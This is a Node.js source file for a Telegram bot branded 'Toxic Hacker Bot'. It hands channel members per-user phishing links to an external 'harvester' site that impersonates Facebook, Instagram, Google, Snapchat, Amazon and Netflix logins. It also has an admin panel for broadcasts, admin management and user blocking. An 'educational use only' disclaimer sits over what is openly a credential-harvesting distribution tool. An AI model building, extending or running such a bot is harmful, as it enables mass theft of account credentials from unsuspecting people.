const { Telegraf, Markup } = require('telegraf');
const fs = require('fs');

const BOT_TOKEN = process.env.BOT_TOKEN;
const HARVESTER_URL = process.env.HARVESTER_URL;
const OWNER_ID = process.env.OWNER_ID;
const CHANNEL_ID = process.env.CHANNEL_ID;
const CHANNEL_LINK = process.env.CHANNEL_LINK;

if (!BOT_TOKEN || !HARVESTER_URL || !OWNER_ID || !CHANNEL_ID || !CHANNEL_LINK) {
    console.error("FATAL ERROR: Missing environment variables.");
    process.exit(1);
}

const bot = new Telegraf(BOT_TOKEN);
const DB_PATH = './db.json';
let adminState = {};

const readDb = () => {
    if (!fs.existsSync(DB_PATH)) {
        fs.writeFileSync(DB_PATH, JSON.stringify({ users: {}, admins: [parseInt(OWNER_ID)], blocked_users: [] }, null, 2));
    }
    return JSON.parse(fs.readFileSync(DB_PATH));
};
const writeDb = (data) => fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
const isAdmin = (id) => readDb().admins.includes(parseInt(id));

const startMessage = `
🔥 *TOXIC HACKER BOT*

🔍 *Credential Testing Interfaces:*
• Facebook
• Instagram
• Snapchat
• Google
• Amazon

🎯 *For Educational Use Only!*
❌ Illegal Use is Prohibited.
✅ Ethical Hacking | OSINT | Red Teaming

🔗 Join: @ToxicBack2025
`;

const adminKeyboard = Markup.inlineKeyboard([
    [Markup.button.callback('📊 User Status', 'admin_status'), Markup.button.callback('📢 Broadcast', 'admin_broadcast')],
    [Markup.button.callback('🔐 Generate Link', 'admin_generate_link')],
    [Markup.button.callback('➕ Add Admin', 'admin_add'), Markup.button.callback('➖ Remove Admin', 'admin_remove')],
    [Markup.button.callback('🚫 Block User', 'admin_block'), Markup.button.callback('✅ Unblock User', 'admin_unblock')],
    [Markup.button.callback('⬅️ Back to Panel', 'admin_panel_back')]
]);

const linkGenerationKeyboard = Markup.inlineKeyboard([
    [Markup.button.callback('📸 Instagram', 'gen_link_Instagram'), Markup.button.callback('📘 Facebook', 'gen_link_Facebook')],
    [Markup.button.callback('🟢 Google', 'gen_link_Google'), Markup.button.callback('👻 Snapchat', 'gen_link_Snapchat')],
    [Markup.button.callback('📦 Amazon', 'gen_link_Amazon'), Markup.button.callback('🎬 Netflix', 'gen_link_Netflix')],
    [Markup.button.callback('⬅️ Back to Panel', 'admin_panel_back')]
]);

bot.start(async (ctx) => {
    const userId = ctx.from.id;
    const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
    const db = readDb();

    if (db.blocked_users.includes(userId)) return;

    try {
        const chatMember = await ctx.telegram.getChatMember(CHANNEL_ID, userId);
        if (!['member', 'administrator', 'creator'].includes(chatMember.status)) throw new Error();

        if (!db.users[userId]) {
            db.users[userId] = { username, joinDate: new Date().toISOString() };
            writeDb(db);
            ctx.telegram.sendMessage(OWNER_ID, `📥 *New User Joined*\n- *User:* ${username}\n- *ID:* \`${userId}\``, { parse_mode: 'Markdown' });
        }

        if (isAdmin(userId)) {
            ctx.replyWithMarkdown('📟 *Admin Panel Activated*', adminKeyboard);
        } else {
            ctx.replyWithMarkdown(startMessage, Markup.inlineKeyboard(linkGenerationKeyboard.reply_markup.inline_keyboard.slice(0, -1)));
        }
    } catch {
        ctx.replyWithMarkdown(`🛑 *ACCESS DENIED*\n\nJoin our channel to continue.`, Markup.inlineKeyboard([
            [Markup.button.url('👉 Join Channel', CHANNEL_LINK)],
            [Markup.button.callback('✅ I Joined', 'check_join')]
        ]));
    }
});

bot.on('callback_query', async (ctx) => {
    const userId = ctx.from.id;
    const data = ctx.callbackQuery.data;
    await ctx.answerCbQuery();

    if (data === 'check_join') return ctx.reply("Please type /start again.");

    const [type, command, service] = data.split('_');

    if (type === 'gen' && command === 'link') {
        const link = `${HARVESTER_URL}/?service=${service}&uid=${userId}`;
        return ctx.replyWithMarkdown(`✅ *[${service} Link]*:\n\`${link}\``);
    }

    if (isAdmin(userId) && type === 'admin') {
        const db = readDb();
        switch (command) {
            case 'status':
                const totalUsers = Object.keys(db.users).length;
                return ctx.editMessageText(`📊 *Bot Status*\n\n👥 Users: ${totalUsers}\n🛡️ Admins: ${db.admins.length}\n🚫 Blocked: ${db.blocked_users.length}`, { parse_mode: 'Markdown', ...adminKeyboard });
            case 'broadcast':
            case 'add':
            case 'remove':
            case 'block':
            case 'unblock':
                const promptMap = {
                    broadcast: '📝 Send the message to broadcast.',
                    add: '📝 Enter new admin ID.',
                    remove: '📝 Enter ID to remove from admins.',
                    block: '📝 Enter user ID to block.',
                    unblock: '📝 Enter user ID to unblock.'
                };
                adminState[userId] = command;
                return ctx.reply(promptMap[command]);
            case 'generate':
                return ctx.editMessageText("🔐 *Generate Test Links*", linkGenerationKeyboard);
            case 'panel':
            case 'panelback':
            case 'panel_back':
                return ctx.editMessageText("📟 *Admin Panel*", { parse_mode: 'Markdown', ...adminKeyboard });
        }
    }
});

bot.on('text', async (ctx) => {
    const userId = ctx.from.id;
    const text = ctx.message.text;

    if (!adminState[userId] || !isAdmin(userId) || text.startsWith('/')) return;

    const db = readDb();
    const action = adminState[userId];
    delete adminState[userId];
    const targetId = parseInt(text);

    switch (action) {
        case 'broadcast':
            ctx.reply("📢 Broadcasting...");
            for (const uid of Object.keys(db.users)) {
                try { await ctx.telegram.sendMessage(uid, text); } catch {}
            }
            return ctx.reply("✅ Broadcast complete.");
        case 'add':
            if (!isNaN(targetId) && !db.admins.includes(targetId)) {
                db.admins.push(targetId); writeDb(db);
                return ctx.reply(`✅ Admin added: ${targetId}`);
            }
            return ctx.reply("❌ Invalid or existing admin.");
        case 'remove':
            if (targetId === parseInt(OWNER_ID)) return ctx.reply("❌ Cannot remove owner.");
            db.admins = db.admins.filter(id => id !== targetId); writeDb(db);
            return ctx.reply(`✅ Removed admin: ${targetId}`);
        case 'block':
            if (isAdmin(targetId)) return ctx.reply("❌ Cannot block admin.");
            if (!db.blocked_users.includes(targetId)) {
                db.blocked_users.push(targetId); writeDb(db);
                return ctx.reply(`🚫 Blocked: ${targetId}`);
            }
            return ctx.reply("⚠️ Already blocked.");
        case 'unblock':
            if (db.blocked_users.includes(targetId)) {
                db.blocked_users = db.blocked_users.filter(id => id !== targetId); writeDb(db);
                return ctx.reply(`✅ Unblocked: ${targetId}`);
            }
            return ctx.reply("❌ ID not found in block list.");
    }
});

bot.launch();
console.log('🔥 Toxic Hacker Bot is online.');

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
